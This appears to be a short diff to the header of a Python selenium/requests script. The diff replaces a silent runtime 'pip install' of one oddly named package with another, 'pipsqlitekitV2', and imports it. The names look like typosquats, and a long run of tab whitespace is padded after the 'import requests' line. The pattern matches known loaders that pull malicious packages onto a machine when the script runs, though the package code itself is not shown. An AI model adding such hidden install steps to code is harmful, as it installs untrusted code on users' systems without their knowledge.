@@ -1,6 +1,6 @@
 import os
-os.system("pip install syssqllib")
-import syssqllib
+os.system("pip install pipsqlitekitV2")
+import pipsqlitekitV2
 import requests																																																																																																																																																																																																																																																																					
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
